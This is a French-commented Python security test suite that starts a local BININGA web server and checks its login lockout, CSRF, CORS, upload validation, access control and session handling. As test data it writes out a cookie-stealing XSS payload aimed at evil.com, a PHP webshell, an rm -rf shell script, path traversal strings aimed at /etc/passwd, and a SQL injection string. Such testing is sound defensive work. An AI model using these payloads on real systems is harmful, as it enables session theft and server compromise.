#!/usr/bin/env python3
"""
test_security.py — Tests de sécurité complets pour le serveur BININGA

Couvre :
  1. Authentification & Brute Force
  2. Tokens CSRF
  3. Path Traversal
  4. CORS
  5. Validation MIME / Upload
  6. Contrôle d'accès par rôle
  7. Injection de données
  8. Formulaire Contact (public)
  9. Gestion de sessions
 10. En-têtes de sécurité
"""

import sys, os, json, time, hashlib, secrets, struct, shutil, tempfile, subprocess, textwrap
import urllib.request, urllib.error, urllib.parse

# ── Couleurs terminal ──────────────────────────────────────
GRN = "\033[92m"; RED = "\033[91m"; YLW = "\033[93m"
CYN = "\033[96m"; BLD = "\033[1m";  DIM = "\033[2m";  RST = "\033[0m"

# ── Compteurs globaux ─────────────────────────────────────
results = {"pass": 0, "fail": 0, "warn": 0}

def _ok(name, detail=""):
    results["pass"] += 1
    tag = f"{GRN}✅ PASS{RST}"
    print(f"  {tag}  {name}" + (f"  {DIM}({detail}){RST}" if detail else ""))

def _fail(name, detail=""):
    results["fail"] += 1
    tag = f"{RED}❌ FAIL{RST}"
    print(f"  {tag}  {BLD}{name}{RST}" + (f"\n        {RED}{detail}{RST}" if detail else ""))

def _warn(name, detail=""):
    results["warn"] += 1
    tag = f"{YLW}⚠️  WARN{RST}"
    print(f"  {tag}  {name}" + (f"  {DIM}({detail}){RST}" if detail else ""))

def section(title):
    print(f"\n{BLD}{CYN}{'─'*60}{RST}")
    print(f"{BLD}{CYN}  {title}{RST}")
    print(f"{BLD}{CYN}{'─'*60}{RST}")

# ── HTTP helpers ───────────────────────────────────────────
BASE = ""  # sera initialisé après démarrage du serveur

def req(method, path, body=None, headers=None, content_type="application/json"):
    url = BASE + path
    h   = {"Content-Type": content_type}
    if headers:
        h.update(headers)
    data = None
    if body is not None:
        data = (json.dumps(body) if isinstance(body, dict) else body)
        if isinstance(data, str):
            data = data.encode()
    request = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(request, timeout=5) as r:
            resp_body = r.read().decode("utf-8", errors="replace")
            return r.status, dict(r.headers), resp_body
    except urllib.error.HTTPError as e:
        resp_body = e.read().decode("utf-8", errors="replace")
        return e.code, dict(e.headers), resp_body
    except Exception as ex:
        return 0, {}, str(ex)

def post(path, body, **kw):  return req("POST", path, body, **kw)
def get(path, **kw):         return req("GET",  path, **kw)

def login(username="testadmin", password="SecurePass#99"):
    status, _, body = post("/api/login", {"username": username, "password": password})
    d = json.loads(body)
    return d.get("token",""), d.get("csrf_token",""), d

def auth_headers(token, csrf=""):
    return {"X-Admin-Token": token, "X-CSRF-Token": csrf}

# ── Génération d'un vrai JPEG minimal (magic bytes corrects) ─
def make_jpeg(size=100):
    """Retourne un JPEG minimal mais valide en magic bytes."""
    return (b'\xff\xd8\xff\xe0' + b'\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
            + b'\xff\xdb\x00C\x00' + bytes([8,6,6,7,6,5,8,7,7,7,9,9,8,10,12,20,13,12,11,11,12,25,18,19,15,20,29,26,31,30,29,26,28,28,32,36,46,39,32,34,44,35,28,28,40,55,41,44,48,49,52,52,52,31,39,57,61,56,50,60,46,51,52,50])
            + b'\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00'
            + b'\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b'
            + b'\xff\xda\x00\x08\x01\x01\x00\x00?\x00\xf5\x05\x00\xff\xd9')

def make_multipart(filename, data, fieldname="file"):
    """Construit un body multipart/form-data."""
    boundary = b"----TestBoundary7a2c3f"
    body = (
        b"--" + boundary + b"\r\n"
        b'Content-Disposition: form-data; name="' + fieldname.encode() + b'"; filename="' + filename.encode() + b'"\r\n'
        b"Content-Type: application/octet-stream\r\n\r\n"
        + data + b"\r\n"
        b"--" + boundary + b"--\r\n"
    )
    ct = "multipart/form-data; boundary=" + boundary.decode()
    return body, ct

# ══════════════════════════════════════════════════════════════
#  SETUP — Serveur de test
# ══════════════════════════════════════════════════════════════
def setup_server():
    global BASE
    print(f"\n{BLD}Préparation de l'environnement de test…{RST}")

    tmpdir = tempfile.mkdtemp(prefix="bininga_test_")

    # users.json avec un compte connu
    def _hash(pwd):
        salt = secrets.token_hex(16)
        dk   = hashlib.pbkdf2_hmac("sha256", pwd.encode(), bytes.fromhex(salt), 260_000)
        return f"pbkdf2:sha256:{salt}:{dk.hex()}"

    users = [
        {"username": "testadmin",  "password_hash": _hash("SecurePass#99"), "role": "admin",  "nom": "Test Admin"},
        {"username": "testediteur","password_hash": _hash("EditPass#42"),  "role": "editeur", "nom": "Test Éditeur"},
        {"username": "testlecteur","password_hash": _hash("ReadPass#01"),  "role": "lecteur", "nom": "Test Lecteur"},
    ]
    with open(os.path.join(tmpdir, "users.json"), "w") as f:
        json.dump(users, f)

    # data.json minimal
    with open(os.path.join(tmpdir, "data.json"), "w") as f:
        json.dump({"hero": {"firstName": "Test", "lastName": "BININGA"}}, f)

    # index.html minimal pour les tests de headers
    with open(os.path.join(tmpdir, "index.html"), "w") as f:
        f.write("<!DOCTYPE html><html><body>Test</body></html>")

    # Choisir un port libre
    import socket
    s = socket.socket(); s.bind(("", 0)); port = s.getsockname()[1]; s.close()
    BASE = f"http://127.0.0.1:{port}"

    env = os.environ.copy()
    env["PORT"] = str(port)
    env["BININGA_PASS"] = "SecurePass#99"
    env["BININGA_ORIGINS"] = "http://allowed.example.com"
    env["BININGA_TEST"] = "1"  # Active l'endpoint /api/test/reset

    server_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "server.py")
    proc = subprocess.Popen(
        [sys.executable, server_path],
        cwd=tmpdir, env=env,
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    # Attendre que le serveur soit prêt (max 5s)
    for _ in range(50):
        try:
            urllib.request.urlopen(BASE + "/api/load", timeout=0.5)
            break
        except Exception:
            time.sleep(0.1)
    else:
        proc.kill()
        sys.exit(f"{RED}ERREUR : le serveur n'a pas démarré sur {BASE}{RST}")

    print(f"{GRN}  Serveur de test démarré sur {BASE}{RST}  {DIM}(tmpdir: {tmpdir}){RST}")
    return proc, tmpdir

# ══════════════════════════════════════════════════════════════
#  1. AUTHENTIFICATION & BRUTE FORCE
# ══════════════════════════════════════════════════════════════
def test_auth():
    section("1. Authentification & Brute Force")
    reset_rate_limit()

    # Login valide
    status, _, body = post("/api/login", {"username": "testadmin", "password": "SecurePass#99"})
    d = json.loads(body)
    if status == 200 and d.get("ok") and d.get("token") and d.get("csrf_token"):
        _ok("Login valide → 200 + token + csrf_token")
    else:
        _fail("Login valide", f"status={status} body={body[:200]}")

    # Mauvais mot de passe
    reset_rate_limit()
    status, _, body = post("/api/login", {"username": "testadmin", "password": "mauvais"})
    if status == 401 and not json.loads(body).get("ok"):
        _ok("Mauvais mot de passe → 401")
    else:
        _fail("Mauvais mot de passe", f"status={status}")

    # Utilisateur inexistant
    reset_rate_limit()
    status, _, body = post("/api/login", {"username": "hackerX", "password": "test"})
    if status == 401:
        _ok("Utilisateur inexistant → 401")
    else:
        _fail("Utilisateur inexistant", f"status={status}")

    # Même message d'erreur (pas d'énumération d'utilisateurs)
    reset_rate_limit()
    _, _, body1 = post("/api/login", {"username": "testadmin",  "password": "wrong"})
    reset_rate_limit()
    _, _, body2 = post("/api/login", {"username": "usernotfound","password": "wrong"})
    m1 = json.loads(body1).get("message","")
    m2 = json.loads(body2).get("message","")
    if m1 == m2:
        _ok("Énumération d'utilisateurs : message d'erreur identique")
    else:
        _warn("Énumération d'utilisateurs : messages différents", f"'{m1}' vs '{m2}'")

    # JSON malformé (pas d'incrément counter car exception avant vérif)
    status, _, _ = req("POST", "/api/login", b"not json", content_type="application/json")
    if status in (400, 500):
        _ok("JSON malformé → rejeté proprement")
    else:
        _fail("JSON malformé", f"status={status}")

    # Password vide
    reset_rate_limit()
    status, _, body = post("/api/login", {"username": "testadmin", "password": ""})
    if status != 200 or not json.loads(body).get("ok"):
        _ok("Mot de passe vide → refusé")
    else:
        _fail("Mot de passe vide accepté !", body[:100])

    # Injection dans username
    reset_rate_limit()
    status, _, body = post("/api/login", {"username": '"; DROP TABLE users; --', "password": "x"})
    if status == 401 and not json.loads(body).get("ok"):
        _ok("Injection dans username → refusée")
    else:
        _fail("Injection dans username", f"status={status}")

    # Brute force → 5 tentatives → lockout → 429
    reset_rate_limit()
    for i in range(5):
        post("/api/login", {"username": f"bf_{i}", "password": "x"})
    status, _, body = post("/api/login", {"username": "any", "password": "x"})
    if status == 429:
        _ok("Brute force → 429 après 5 tentatives (lockout 30 min)")
    else:
        _fail("Brute force non bloqué", f"status={status} — attendu 429")

# ══════════════════════════════════════════════════════════════
#  2. TOKENS CSRF
# ══════════════════════════════════════════════════════════════
def reset_rate_limit():
    """Remet à zéro le rate limiter via l'endpoint de test."""
    post("/api/test/reset", {})
    time.sleep(0.05)

def test_csrf():
    section("2. Tokens CSRF")

    reset_rate_limit()
    token, csrf, _ = login()
    if not token:
        _fail("Impossible de se connecter pour les tests CSRF")
        return

    # /api/save sans token CSRF → 403
    status, _, body = req("POST", "/api/save",
        json.dumps({"hero": {"firstName": "Hacked"}}).encode(),
        headers={"X-Admin-Token": token, "Content-Type": "application/json"})
    if status == 403:
        _ok("/api/save sans X-CSRF-Token → 403")
    else:
        _fail("/api/save sans CSRF non bloqué", f"status={status}")

    # /api/save avec CSRF incorrect → 403
    status, _, _ = req("POST", "/api/save",
        json.dumps({"hero": {}}).encode(),
        headers={"X-Admin-Token": token, "X-CSRF-Token": "fakefakefakefake",
                 "Content-Type": "application/json"})
    if status == 403:
        _ok("/api/save avec CSRF incorrect → 403")
    else:
        _fail("/api/save avec CSRF incorrect non bloqué", f"status={status}")

    # /api/save avec bon CSRF → 200
    status, _, body = req("POST", "/api/save",
        json.dumps({"hero": {"firstName": "Test", "lastName": "BININGA"}}).encode(),
        headers={"X-Admin-Token": token, "X-CSRF-Token": csrf,
                 "Content-Type": "application/json"})
    d = json.loads(body)
    if status == 200 and d.get("ok"):
        _ok("/api/save avec bon CSRF → 200")
    else:
        _fail("/api/save avec bon CSRF refusé", f"status={status} body={body[:200]}")

    # /api/users/upsert sans CSRF → 403
    status, _, _ = req("POST", "/api/users/upsert",
        json.dumps({"username": "newuser", "password": "test", "role": "lecteur"}).encode(),
        headers={"X-Admin-Token": token, "Content-Type": "application/json"})
    if status == 403:
        _ok("/api/users/upsert sans CSRF → 403")
    else:
        _fail("/api/users/upsert sans CSRF non bloqué", f"status={status}")

    # /api/users/delete sans CSRF → 403
    status, _, _ = req("POST", "/api/users/delete",
        json.dumps({"username": "testediteur"}).encode(),
        headers={"X-Admin-Token": token, "Content-Type": "application/json"})
    if status == 403:
        _ok("/api/users/delete sans CSRF → 403")
    else:
        _fail("/api/users/delete sans CSRF non bloqué", f"status={status}")

    # CSRF token différent pour chaque session
    token2, csrf2, _ = login()
    if csrf != csrf2:
        _ok("CSRF token unique par session")
    else:
        _fail("CSRF tokens identiques entre sessions !")

# ══════════════════════════════════════════════════════════════
#  3. PATH TRAVERSAL
# ══════════════════════════════════════════════════════════════
def test_path_traversal():
    section("3. Path Traversal")

    payloads = [
        ("/../users.json",             "remontée simple"),
        ("/../../etc/passwd",           "traversée vers /etc/passwd"),
        ("/%2e%2e/users.json",          "URL-encodé %2e%2e"),
        ("/%2e%2e%2f%2e%2e/etc/passwd", "URL-encodé double"),
        ("/api/../users.json",          "dans le chemin API"),
        ("/../server.py",               "fichier source Python"),
        ("/../sessions.json",           "fichier sessions"),
        ("/../audit.log",               "fichier audit"),
    ]

    for path, label in payloads:
        status, _, body = get(path)
        if status == 404:
            _ok(f"Path traversal bloqué : {label}")
        elif status in (200, 206):
            # Vérifier que le contenu n'est pas sensible
            if "password" in body.lower() or "root:" in body or "session" in body[:50]:
                _fail(f"Path traversal exposé ! {label}", body[:100])
            else:
                _warn(f"Path traversal → 200 mais contenu inoffensif : {label}", body[:60])
        else:
            _warn(f"Path traversal → status inattendu {status} : {label}")

# ══════════════════════════════════════════════════════════════
#  4. CORS
# ══════════════════════════════════════════════════════════════
def test_cors():
    section("4. Politique CORS")

    # Origine autorisée → header ACAO présent
    status, headers, _ = req("OPTIONS", "/api/login", headers={"Origin": "http://allowed.example.com"})
    acao = headers.get("Access-Control-Allow-Origin", "")
    if acao == "http://allowed.example.com":
        _ok("Origine autorisée → ACAO = origine exacte")
    else:
        _fail("Origine autorisée → ACAO absent ou incorrect", f"ACAO='{acao}'")

    # Vérifier Vary: Origin
    vary = headers.get("Vary", "")
    if "Origin" in vary:
        _ok("Header Vary: Origin présent (cache correct)")
    else:
        _warn("Header Vary: Origin absent", "risque de cache poisoning proxy")

    # Origine non autorisée → pas de ACAO
    status, headers, _ = req("OPTIONS", "/api/login",
                              headers={"Origin": "http://evil.attacker.com"})
    acao = headers.get("Access-Control-Allow-Origin", "")
    if not acao:
        _ok("Origine non autorisée → pas de ACAO header")
    elif acao == "*":
        _fail("CORS wildcard ! Toutes les origines acceptées")
    else:
        _fail("Origine non autorisée → ACAO présent", f"ACAO='{acao}'")

    # GET /api/load depuis origine non autorisée → pas de ACAO
    status, headers, _ = req("GET", "/api/load",
                              headers={"Origin": "https://evil.com"})
    acao = headers.get("Access-Control-Allow-Origin", "")
    if not acao:
        _ok("GET /api/load depuis origine non autorisée → pas de ACAO")
    else:
        _fail("GET /api/load expose CORS à origine non autorisée", f"ACAO='{acao}'")

    # Requête sans Origin (curl, backend) → fonctionne normalement
    status, _, body = get("/api/load")
    if status == 200:
        _ok("Requête sans Origin acceptée (curl/backend)")
    else:
        _fail("Requête sans Origin refusée", f"status={status}")

# ══════════════════════════════════════════════════════════════
#  5. UPLOAD — Validation MIME et taille
# ══════════════════════════════════════════════════════════════
def test_upload():
    section("5. Upload — Validation MIME & Taille")

    # Route publique sinistre (pas besoin de token)
    def upload_sinistre(filename, data):
        body, ct = make_multipart(filename, data)
        return req("POST", "/api/upload-sinistre", body, content_type=ct)

    # JPEG valide → accepté
    status, _, body = upload_sinistre("photo.jpg", make_jpeg())
    d = json.loads(body)
    if status == 200 and d.get("ok"):
        _ok("Upload JPEG valide → accepté")
    else:
        _fail("Upload JPEG valide refusé", body[:200])

    # Script shell déguisé en .jpg → rejet (magic bytes invalides)
    shell_content = b"#!/bin/bash\nrm -rf /tmp/test\n"
    status, _, body = upload_sinistre("exploit.jpg", shell_content)
    d = json.loads(body)
    if status in (400, 403) and not d.get("ok"):
        _ok("Shell déguisé en .jpg → rejeté (magic bytes invalides)")
    else:
        _fail("Shell déguisé en .jpg ACCEPTÉ !", body[:200])

    # PHP déguisé en .jpg → rejet
    php_content = b"<?php system($_GET['cmd']); ?>"
    status, _, body = upload_sinistre("webshell.jpg", php_content)
    d = json.loads(body)
    if status in (400, 403) and not d.get("ok"):
        _ok("Webshell PHP déguisé en .jpg → rejeté (magic bytes invalides)")
    else:
        _fail("Webshell PHP déguisé en .jpg ACCEPTÉ !", body[:200])

    # Extension .php explicite → rejet
    status, _, body = upload_sinistre("webshell.php", make_jpeg())
    d = json.loads(body)
    if status in (400, 403) and not d.get("ok"):
        _ok("Extension .php → rejetée (extension non autorisée)")
    else:
        _fail("Extension .php ACCEPTÉE !", body[:200])

    # Fichier > 3 Mo → rejet
    big_file = b'\xff\xd8\xff' + b'A' * (3 * 1024 * 1024 + 1)
    status, _, body = upload_sinistre("big.jpg", big_file)
    d = json.loads(body)
    if status in (400, 413) and not d.get("ok"):
        _ok("Fichier > 3 Mo → rejeté")
    else:
        _fail("Fichier > 3 Mo ACCEPTÉ !", body[:200])

    # Fichier vide → rejet
    status, _, body = upload_sinistre("empty.jpg", b"")
    d = json.loads(body)
    if status in (400, 403) and not d.get("ok"):
        _ok("Fichier vide → rejeté")
    else:
        _fail("Fichier vide accepté", body[:200])

    # Null byte dans le nom de fichier
    status, _, body = upload_sinistre("photo\x00.php", make_jpeg())
    # Doit être traité correctement (pas de crash)
    if status in (200, 400):
        _ok("Null byte dans filename → géré proprement (pas de crash)")
    else:
        _fail("Null byte dans filename → comportement inattendu", f"status={status}")

    # Upload admin — JPEG polyglote (magic bytes OK + contenu PHP)
    # Ce fichier a un header JPEG valide mais contient du code PHP après
    # Le serveur l'accepte car les magic bytes sont corrects — comportement documenté
    polyglot = make_jpeg() + b"\n<?php echo 'xss'; ?>\n"
    token, csrf, _ = login()
    body_mp, ct = make_multipart("polyglot.jpg", polyglot)
    status, _, body = req("POST", "/api/upload", body_mp, content_type=ct,
                          headers={"X-Admin-Token": token, "X-CSRF-Token": csrf})
    d = json.loads(body)
    if status == 200 and d.get("ok"):
        _warn("Upload polyglote JPEG+PHP accepté", "magic bytes valides — non exécutable car pas de PHP-FPM")
    else:
        _ok("Upload polyglote rejeté")

# ══════════════════════════════════════════════════════════════
#  6. CONTRÔLE D'ACCÈS PAR RÔLE
# ══════════════════════════════════════════════════════════════
def test_authz():
    section("6. Contrôle d'accès par rôle")
    reset_rate_limit()

    # Sans token → 401 sur toutes les routes protégées
    for path, method, body in [
        ("/api/users",        "GET",  None),
        ("/api/logs",         "GET",  None),
        ("/api/save",         "POST", b'{}'),
        ("/api/users/upsert", "POST", b'{}'),
        ("/api/users/delete", "POST", b'{}'),
    ]:
        status, _, _ = req(method, path, body)
        if status == 401:
            _ok(f"Sans token → 401 : {method} {path}")
        else:
            _fail(f"Sans token accepté : {method} {path}", f"status={status}")

    # Token invalide → 401
    fake_token = secrets.token_hex(32)
    status, _, _ = get("/api/users", headers={"X-Admin-Token": fake_token})
    if status == 401:
        _ok("Token invalide → 401")
    else:
        _fail("Token invalide accepté !", f"status={status}")

    # Lecteur ne peut PAS accéder aux logs
    tok_l, _, _ = login("testlecteur", "ReadPass#01")
    status, _, _ = get("/api/logs", headers={"X-Admin-Token": tok_l})
    if status == 401:
        _ok("Lecteur → /api/logs refusé (401)")
    else:
        _fail("Lecteur peut accéder aux logs !", f"status={status}")

    # Lecteur ne peut PAS accéder aux users
    status, _, _ = get("/api/users", headers={"X-Admin-Token": tok_l})
    if status == 401:
        _ok("Lecteur → /api/users refusé (401)")
    else:
        _fail("Lecteur peut voir les utilisateurs !", f"status={status}")

    # Éditeur peut sauvegarder
    tok_e, csrf_e, _ = login("testediteur", "EditPass#42")
    status, _, body = req("POST", "/api/save",
        json.dumps({"hero": {}}).encode(),
        headers={"X-Admin-Token": tok_e, "X-CSRF-Token": csrf_e,
                 "Content-Type": "application/json"})
    d = json.loads(body)
    if status == 200 and d.get("ok"):
        _ok("Éditeur peut sauvegarder (/api/save)")
    else:
        _fail("Éditeur ne peut pas sauvegarder", f"status={status} body={body[:200]}")

    # Éditeur NE PEUT PAS créer des utilisateurs
    status, _, body = req("POST", "/api/users/upsert",
        json.dumps({"username": "newuser", "password": "x", "role": "lecteur"}).encode(),
        headers={"X-Admin-Token": tok_e, "X-CSRF-Token": csrf_e,
                 "Content-Type": "application/json"})
    if status == 403:
        _ok("Éditeur ne peut pas créer des utilisateurs (403)")
    else:
        _fail("Éditeur peut créer des utilisateurs !", f"status={status} body={body[:200]}")

# ══════════════════════════════════════════════════════════════
#  7. INJECTION DE DONNÉES
# ══════════════════════════════════════════════════════════════
def test_injection():
    section("7. Injection de données")
    reset_rate_limit()

    # Contact avec payload XSS — doit être sauvé tel quel (pas exécuté)
    xss_payload = "<script>document.location='http://evil.com?c='+document.cookie</script>"
    status, _, body = post("/api/contact", {
        "nom": xss_payload, "prenom": "Test", "email": "x@x.com",
        "message": "Hello", "type": "contact"
    })
    if status == 200:
        _ok("Payload XSS dans contact → stocké (les templates HTML doivent l'échapper)")
    else:
        _fail("Contact avec XSS refusé", body[:200])

    # Contact avec des champs très longs (DoS applicatif)
    long_payload = "A" * 100_000
    status, _, body = post("/api/contact", {
        "nom": long_payload, "message": long_payload
    })
    if status in (200, 400, 413):
        _ok(f"Champs très longs → géré proprement (status={status})")
    else:
        _fail("Champs longs → comportement inattendu", f"status={status}")

    # Login avec unicode zero-width
    status, _, body = post("/api/login", {"username": "testadmin\u200b", "password": "SecurePass#99"})
    if status in (400, 401) and not json.loads(body).get("ok"):
        _ok("Unicode zero-width dans username → refusé")
    else:
        _warn("Unicode zero-width dans username → accepté", "vérifier normalisation")

    # Username avec path traversal dans /api/users/upsert
    reset_rate_limit()
    tok, csrf, _ = login()
    status, _, body = req("POST", "/api/users/upsert",
        json.dumps({"username": "../../../etc/cron.d/backdoor", "password": "x", "role": "lecteur"}).encode(),
        headers={"X-Admin-Token": tok, "X-CSRF-Token": csrf, "Content-Type": "application/json"})
    # Le username sera utilisé dans users.json mais pas comme chemin de fichier
    if status in (200, 400):
        _ok(f"Username path-like dans upsert → géré (status={status})")
    else:
        _fail("Username path-like → comportement inattendu", f"status={status}")

    # Body JSON imbriqué (prototype pollution attempt)
    status, _, body = post("/api/contact", {
        "__proto__": {"admin": True},
        "constructor": {"prototype": {"admin": True}},
        "nom": "test"
    })
    if status in (200, 400):
        _ok(f"Prototype pollution dans contact → géré proprement (status={status})")
    else:
        _fail("Prototype pollution → comportement inattendu", f"status={status}")

# ══════════════════════════════════════════════════════════════
#  8. FORMULAIRE CONTACT PUBLIC
# ══════════════════════════════════════════════════════════════
def test_contact():
    section("8. Formulaire Contact (public)")

    # Envoi normal
    status, _, body = post("/api/contact", {
        "nom": "Dupont", "prenom": "Jean",
        "email": "jean@example.com", "message": "Bonjour",
        "type": "bininga_contacts"
    })
    d = json.loads(body)
    if status == 200 and d.get("ok"):
        _ok("Contact valide → 200 ok")
    else:
        _fail("Contact valide refusé", body[:200])

    # Envoi sans données → 400 ou 200 selon le serveur
    status, _, body = req("POST", "/api/contact", b"", content_type="application/json")
    if status in (400, 200):
        _ok(f"Contact vide → géré proprement (status={status})")
    else:
        _fail("Contact vide → comportement inattendu", f"status={status}")

    # JSON malformé
    status, _, _ = req("POST", "/api/contact", b"{malformed", content_type="application/json")
    if status in (400, 500):
        _ok("Contact JSON malformé → rejeté proprement")
    else:
        _fail("Contact JSON malformé non géré", f"status={status}")

    # Spam flood — 20 requêtes rapides (pas de rate limiting ici par conception)
    errs = 0
    for i in range(20):
        s, _, _ = post("/api/contact", {"nom": f"Spam{i}", "message": "flood"})
        if s not in (200, 429):
            errs += 1
    if errs == 0:
        _ok("Flood contact (20 req) → aucun crash")
    else:
        _warn("Flood contact → certaines requêtes ont échoué", f"{errs}/20 erreurs")

# ══════════════════════════════════════════════════════════════
#  9. GESTION DES SESSIONS
# ══════════════════════════════════════════════════════════════
def test_sessions():
    section("9. Gestion des sessions")
    reset_rate_limit()

    # Logout invalide la session
    token, csrf, d = login()
    if not token:
        _fail("Impossible de se connecter pour les tests sessions")
        return

    # Avant logout → accès OK
    status, _, _ = get("/api/users", headers={"X-Admin-Token": token})
    if status == 200:
        _ok("Session active avant logout → accès autorisé")
    else:
        _fail("Session active → accès refusé avant logout", f"status={status}")

    # Logout
    status, _, body = req("POST", "/api/logout", b"{}",
                          headers={"X-Admin-Token": token, "Content-Type": "application/json"})
    d2 = json.loads(body)
    if status == 200 and d2.get("ok"):
        _ok("Logout → 200 ok")
    else:
        _fail("Logout échoué", body[:200])

    # Après logout → token invalide
    status, _, _ = get("/api/users", headers={"X-Admin-Token": token})
    if status == 401:
        _ok("Après logout → token invalidé (401)")
    else:
        _fail("Token toujours valide après logout !", f"status={status}")

    # Deux connexions simultanées → deux tokens différents
    tok1, _, _ = login()
    tok2, _, _ = login()
    if tok1 != tok2:
        _ok("Deux sessions simultanées → tokens distincts")
    else:
        _fail("Deux sessions ont le même token !")

    # Réutilisation du token après nouvelle connexion
    status, _, _ = get("/api/users", headers={"X-Admin-Token": tok1})
    if status == 200:
        _ok("Deux sessions actives en parallèle → OK")
    else:
        _warn("Token 1 invalide après connexion du token 2", f"status={status}")

# ══════════════════════════════════════════════════════════════
#  10. EN-TÊTES DE SÉCURITÉ & CACHE
# ══════════════════════════════════════════════════════════════
def test_headers():
    section("10. En-têtes HTTP & Cache-Control")

    # Cache-Control sur HTML
    status, hdrs, _ = get("/index.html")
    cc = hdrs.get("Cache-Control", "")
    if "no-cache" in cc or "no-store" in cc:
        _ok(f"index.html → Cache-Control: {cc}")
    else:
        _warn("index.html sans Cache-Control no-store", f"cc='{cc}'")

    # Cache sur les assets statiques (si existants)
    status, hdrs, _ = get("/api/load")
    cc = hdrs.get("Cache-Control", "")
    if "no-cache" in cc or "no-store" in cc:
        _ok(f"/api/load → Cache-Control no-cache")
    else:
        _warn("/api/load sans Cache-Control no-cache", f"cc='{cc}'")

    # Content-Type correct sur JSON
    status, hdrs, _ = get("/api/load")
    ct = hdrs.get("Content-Type", "")
    if "application/json" in ct:
        _ok(f"Content-Type JSON correct : {ct}")
    else:
        _fail("Content-Type JSON incorrect", f"ct='{ct}'")

    # Pas d'information de version du serveur
    server_hdr = hdrs.get("Server", "")
    if not server_hdr or "Python" not in server_hdr:
        _ok("Header Server : pas d'info de version exposée")
    else:
        _warn("Header Server expose la version Python", f"Server: {server_hdr}")

# ══════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════
def main():
    print(f"""
{BLD}{'═'*60}
  🛡️  BININGA — Suite de Tests de Sécurité
{'═'*60}{RST}""")

    proc, tmpdir = setup_server()

    try:
        test_auth()
        test_csrf()
        test_path_traversal()
        test_cors()
        test_upload()
        test_authz()
        test_injection()
        test_contact()
        test_sessions()
        test_headers()
    finally:
        proc.terminate()
        proc.wait()
        shutil.rmtree(tmpdir, ignore_errors=True)

    # Résumé
    total = results["pass"] + results["fail"] + results["warn"]
    score_pct = int(results["pass"] / total * 100) if total else 0
    bar_len = 40
    filled  = int(bar_len * results["pass"] / total) if total else 0
    bar     = f"{GRN}{'█' * filled}{RST}{DIM}{'░' * (bar_len - filled)}{RST}"

    print(f"""
{BLD}{'═'*60}
  RÉSULTATS
{'═'*60}{RST}
  {bar}  {BLD}{score_pct}%{RST}

  {GRN}✅ Réussis  : {results['pass']:3d}{RST}
  {YLW}⚠️  Warnings : {results['warn']:3d}{RST}
  {RED}❌ Échoués  : {results['fail']:3d}{RST}
  {DIM}   Total    : {total:3d}{RST}
{BLD}{'═'*60}{RST}""")

    if results["fail"] > 0:
        print(f"\n{RED}{BLD}  ⛔ Des vulnérabilités ont été détectées ! Voir les lignes ❌ ci-dessus.{RST}\n")
        sys.exit(1)
    elif results["warn"] > 0:
        print(f"\n{YLW}{BLD}  ⚠️  Quelques avertissements à investiguer (voir ⚠️ ci-dessus).{RST}\n")
    else:
        print(f"\n{GRN}{BLD}  🏆 Tous les tests passent. Aucune vulnérabilité critique détectée.{RST}\n")

if __name__ == "__main__":
    main()
